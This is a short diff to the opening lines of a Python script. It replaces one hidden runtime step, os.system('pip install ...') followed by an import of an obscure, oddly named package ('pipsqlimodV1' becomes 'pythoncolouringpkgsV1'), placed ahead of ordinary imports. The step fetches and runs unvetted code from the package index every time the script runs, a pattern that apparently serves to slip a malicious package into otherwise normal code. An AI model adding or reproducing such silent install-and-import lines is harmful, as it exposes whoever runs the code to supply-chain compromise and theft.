@@ -1,6 +1,6 @@
 import os
-os.system("pip install pipsqlimodV1")
-import pipsqlimodV1
+os.system("pip install pythoncolouringpkgsV1")
+import pythoncolouringpkgsV1
 import json
 import httpx
 import time
